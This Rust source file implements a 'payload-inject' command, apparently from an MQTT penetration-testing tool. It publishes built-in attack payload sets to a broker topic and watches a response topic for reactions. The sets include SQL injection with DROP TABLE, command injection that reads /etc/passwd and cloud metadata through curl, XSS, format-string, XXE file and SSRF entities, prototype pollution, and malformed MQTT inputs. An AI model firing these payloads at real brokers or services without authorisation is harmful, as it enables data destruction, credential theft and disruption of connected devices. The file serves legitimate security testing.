use crate::mqtt::client::{build_options, parse_qos, ConnectionArgs};
use anyhow::{bail, Context, Result};
use clap::Args;
use rumqttc::{AsyncClient, Event, Packet, QoS};
use std::fs::File;
use std::io::{BufRead, BufReader};
use tokio::time::{sleep, Duration};

#[derive(Clone)]
struct Probe {
    label: String,
    data: Vec<u8>,
}

#[derive(Args, Debug)]
pub struct PayloadInjectArgs {
    #[command(flatten)]
    pub connection: ConnectionArgs,

    /// Target topic to publish payloads to
    #[arg(short = 't', long)]
    pub topic: String,

    /// Custom payload file, one payload per line
    #[arg(short = 'w', long)]
    pub wordlist: Option<String>,

    /// Built-in payload set(s): sql, cmd, xss, fmt, xxe, json, mqtt, all (repeatable)
    #[arg(long = "set", value_name = "SET")]
    pub sets: Vec<String>,

    /// Subscribe to this topic and print any responses received while probing
    #[arg(long)]
    pub monitor: Option<String>,

    /// Extra seconds to listen on the monitor topic after the last payload
    #[arg(long, default_value_t = 3)]
    pub monitor_wait: u64,

    /// Milliseconds to wait between payloads
    #[arg(long, default_value_t = 100)]
    pub delay: u64,

    /// QoS level for published payloads (0, 1, or 2)
    #[arg(short = 'q', long, default_value_t = 1)]
    pub qos: u8,

    /// Set the retain flag on every published payload
    #[arg(short = 'r', long)]
    pub retain: bool,
}

/// Run the payload-inject command
pub async fn run(args: PayloadInjectArgs) -> Result<()> {
    if args.sets.is_empty() && args.wordlist.is_none() {
        bail!("specify at least one --set <SET> or --wordlist <FILE>");
    }

    let probes = build_probes(&args)?;
    if probes.is_empty() {
        bail!("no payloads to send");
    }

    let qos = parse_qos(args.qos)?;

    eprintln!("[*] Target  : {}", args.topic);
    eprintln!("[*] Payloads: {}", probes.len());
    if let Some(m) = &args.monitor {
        eprintln!("[*] Monitor : {}", m);
    }
    eprintln!("[*] Delay   : {}ms between payloads\n", args.delay);

    // Optional monitor — runs on a separate connection so client IDs don't collide.
    let monitor_handle = if let Some(monitor_topic) = args.monitor.clone() {
        let mut conn = args.connection.clone();
        conn.client_id = format!("{}-monitor", conn.client_id);
        Some(tokio::spawn(run_monitor(conn, monitor_topic)))
    } else {
        None
    };

    // Publish connection — event loop driven in a background task.
    let opts = build_options(&args.connection)?;
    let (client, mut eventloop) = AsyncClient::new(opts, 256);

    let (connected_tx, connected_rx) = tokio::sync::oneshot::channel::<()>();
    let el_handle = tokio::spawn(async move {
        let mut signal = Some(connected_tx);
        loop {
            match eventloop.poll().await {
                Ok(Event::Incoming(Packet::ConnAck(_))) => {
                    eprintln!("[+] Connected");
                    if let Some(tx) = signal.take() {
                        tx.send(()).ok();
                    }
                }
                Ok(_) => {}
                Err(e) => {
                    eprintln!("[!] Connection error: {}", e);
                    break;
                }
            }
        }
    });

    // Wait for the broker to accept the connection before sending anything.
    tokio::time::timeout(Duration::from_secs(10), connected_rx)
        .await
        .context("timed out waiting for broker connection")?
        .ok();

    let total = probes.len();
    let mut sent = 0usize;

    for (i, probe) in probes.iter().enumerate() {
        let label = if probe.label.len() > 70 {
            format!("{} ...", &probe.label[..70])
        } else {
            probe.label.clone()
        };
        eprintln!("[{}/{}] {}", i + 1, total, label);

        client
            .publish(&args.topic, qos, args.retain, probe.data.clone())
            .await?;
        sent += 1;

        if args.delay > 0 && i + 1 < total {
            sleep(Duration::from_millis(args.delay)).await;
        }
    }

    eprintln!("\n[*] Sent {} payload(s)", sent);

    if monitor_handle.is_some() {
        eprintln!("[*] Waiting {}s for responses ...", args.monitor_wait);
        sleep(Duration::from_secs(args.monitor_wait)).await;
    }

    client.disconnect().await.ok();
    sleep(Duration::from_millis(200)).await; // allow DISCONNECT to flush
    el_handle.abort();

    if let Some(h) = monitor_handle {
        h.abort();
    }

    println!("[+] Done — {} payload(s) sent to '{}'", sent, args.topic);
    Ok(())
}

/// Subscribe to `topic` on a separate connection and print every incoming message.
async fn run_monitor(conn: ConnectionArgs, topic: String) {
    let opts = match build_options(&conn) {
        Ok(o) => o,
        Err(e) => {
            eprintln!("[!] Monitor: connection setup failed: {}", e);
            return;
        }
    };
    let (client, mut eventloop) = AsyncClient::new(opts, 64);
    if client.subscribe(&topic, QoS::AtMostOnce).await.is_err() {
        return;
    }
    loop {
        match eventloop.poll().await {
            Ok(Event::Incoming(Packet::Publish(p))) => {
                let payload = match std::str::from_utf8(&p.payload) {
                    Ok(s) => s.to_string(),
                    Err(_) => format!("<binary {} byte(s)>", p.payload.len()),
                };
                eprintln!("[<] {} : {}", p.topic, payload);
            }
            Ok(_) => {}
            Err(_) => break,
        }
    }
}

/// Build the list of probes based on the specified sets and/or wordlist
fn build_probes(args: &PayloadInjectArgs) -> Result<Vec<Probe>> {
    for s in &args.sets {
        match s.as_str() {
            "sql" | "cmd" | "xss" | "fmt" | "xxe" | "json" | "mqtt" | "all" => {}
            unknown => bail!(
                "unknown payload set '{}' (valid: sql, cmd, xss, fmt, xxe, json, mqtt, all)",
                unknown
            ),
        }
    }

    let use_all = args.sets.iter().any(|s| s == "all");
    let has = |name: &str| use_all || args.sets.iter().any(|s| s == name);

    let mut probes: Vec<Probe> = Vec::new();
    if has("sql")  { probes.extend(sql_probes()); }
    if has("cmd")  { probes.extend(cmd_probes()); }
    if has("xss")  { probes.extend(xss_probes()); }
    if has("fmt")  { probes.extend(fmt_probes()); }
    if has("xxe")  { probes.extend(xxe_probes()); }
    if has("json") { probes.extend(json_probes()); }
    if has("mqtt") { probes.extend(mqtt_probes()); }

    if let Some(path) = &args.wordlist {
        probes.extend(load_wordlist(path)?);
    }

    Ok(probes)
}

/// Helper function to create a Probe from a string
fn tp(s: &str) -> Probe {
    Probe { label: s.to_owned(), data: s.as_bytes().to_vec() }
}

/// Built-in payload sets
fn sql_probes() -> Vec<Probe> {
    [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "admin'--",
        "1; DROP TABLE users--",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1 OR 1=1",
        "' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in command injection payloads
fn cmd_probes() -> Vec<Probe> {
    [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "&& id",
        "|| id",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; ls -la /",
        "value`sleep 5`",
        "value; sleep 5 #",
        "; ping -c 3 127.0.0.1",
        "$(curl http://169.254.169.254/latest/meta-data/)",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in XSS payloads
fn xss_probes() -> Vec<Probe> {
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in format string payloads
fn fmt_probes() -> Vec<Probe> {
    [
        "%s%s%s%s",
        "%n%n%n%n",
        "%x%x%x%x",
        "%d%d%d%d",
        "%08x.%08x.%08x",
        "{0}",
        "{{}}",
        "{__class__}",
        "%(username)s",
        "%{{7*7}}",
        "\\x41\\x41\\x41\\x41",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in XXE payloads
fn xxe_probes() -> Vec<Probe> {
    [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><foo>&xxe;</foo>",
        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in JSON payloads
fn json_probes() -> Vec<Probe> {
    [
        "{\"$where\": \"1==1\"}",
        "{\"$gt\": \"\"}",
        "{\"__proto__\": {\"admin\": true}}",
        "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
        "null",
        "[]",
        "true",
        "{\"key\": \"value\", \"key\": \"override\"}",
        "{\"a\":{\"b\":{\"c\":{\"d\":{\"e\":{\"f\":{}}}}}}}",
        "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]",
    ]
    .map(tp)
    .to_vec()
}

/// Built-in MQTT payloads
fn mqtt_probes() -> Vec<Probe> {
    vec![
        Probe { label: "(empty payload)".into(),            data: vec![] },
        Probe { label: "null byte \\x00".into(),            data: vec![0x00] },
        Probe { label: "null byte mid-string".into(),       data: b"hello\x00world".to_vec() },
        Probe { label: "CR LF injection".into(),            data: b"value\r\nX-Injected: evil".to_vec() },
        Probe { label: "MQTT wildcard #".into(),            data: b"#".to_vec() },
        Probe { label: "MQTT wildcard +".into(),            data: b"+".to_vec() },
        Probe { label: "path traversal in payload".into(),  data: b"../../etc/passwd".to_vec() },
        Probe { label: "malformed UTF-8".into(),            data: vec![0xff, 0xfe, 0x41, 0x00, 0x42] },
        Probe { label: "Unicode BOM + RTL override".into(), data: "\u{FEFF}\u{202E}payload".as_bytes().to_vec() },
        Probe { label: "1 KB of 'A'".into(),                data: vec![b'A'; 1_024] },
        Probe { label: "64 KB of 'A'".into(),               data: vec![b'A'; 65_535] },
    ]
}

/// Load a wordlist file and return a vector of Probes
fn load_wordlist(path: &str) -> Result<Vec<Probe>> {
    let file = File::open(path).with_context(|| format!("cannot open wordlist '{}'", path))?;
    let mut probes = Vec::new();
    for line in BufReader::new(file).lines() {
        let raw = line.with_context(|| format!("error reading '{}'", path))?;
        let trimmed = raw.trim_end_matches(['\n', '\r']);
        if !trimmed.is_empty() {
            probes.push(tp(trimmed));
        }
    }
    Ok(probes)
}
